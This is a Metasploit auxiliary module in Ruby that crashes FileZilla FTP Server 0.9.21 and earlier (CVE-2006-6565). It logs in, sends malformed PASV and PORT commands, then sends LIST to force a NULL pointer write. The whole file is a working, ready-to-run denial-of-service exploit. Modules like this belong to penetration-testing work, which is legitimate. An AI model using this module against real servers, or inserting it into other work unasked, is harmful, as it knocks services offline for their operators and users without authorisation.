##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Ftp
  include Msf::Auxiliary::Dos

  def initialize(info = {})
    super(update_info(info,
      'Name'		=> 'FileZilla FTP Server Malformed PORT Denial of Service',
      'Description'	=> %q{
        This module triggers a Denial of Service condition in the FileZilla FTP
        Server versions 0.9.21 and earlier. By sending a malformed PORT command
        then LIST command, the server attempts to write to a NULL pointer.
      },
      'Author' 		=> [ 'patrick' ],
      'License'        	=> MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '21542' ],
          [ 'BID', '21549' ],
          [ 'CVE', '2006-6565' ],
          [ 'EDB', '2914' ],
          [ 'OSVDB', '34435' ]
        ],
      'DisclosureDate' => 'Dec 11 2006'))
  end

  def run
    begin
      c = connect_login
    rescue Rex::ConnectionRefused
      print_error("Connection refused.")
      return
    rescue Rex::ConnectionTimeout
      print_error("Connection timed out")
      return
    end

    return if not c

    send_cmd(['PASV', 'A*'], true) # Assigns PASV port
    send_cmd(['PORT', 'A*'], true) # Rejected but seems to assign NULL to pointer
    send_cmd(['LIST'], true) # Try and push data to NULL port, trigger crash :)

    disconnect
  end

end
